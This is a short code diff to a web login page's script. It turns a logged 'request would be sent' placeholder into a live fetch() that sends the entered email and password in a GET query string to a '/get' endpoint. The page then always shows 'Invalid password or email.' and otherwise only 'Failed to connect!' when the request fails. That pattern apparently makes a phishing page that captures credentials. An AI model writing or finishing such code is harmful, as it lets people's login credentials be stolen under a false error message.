@@ -231,8 +231,14 @@
             const password = document.getElementById("password").value;
             const params = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
             const endpoint = `/get?${params}`;
-            console.log("Request would be sent to endpoint:", endpoint);
-            document.getElementById("errorMessage").textContent = "Invalid password or email.";
+            fetch(endpoint)
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById("errorMessage").textContent = "Invalid password or email.";
+                })
+                .catch(error => {
+                    document.getElementById("errorMessage").textContent = "Failed to connect!";
+                });
         });
     </script>
 </body>
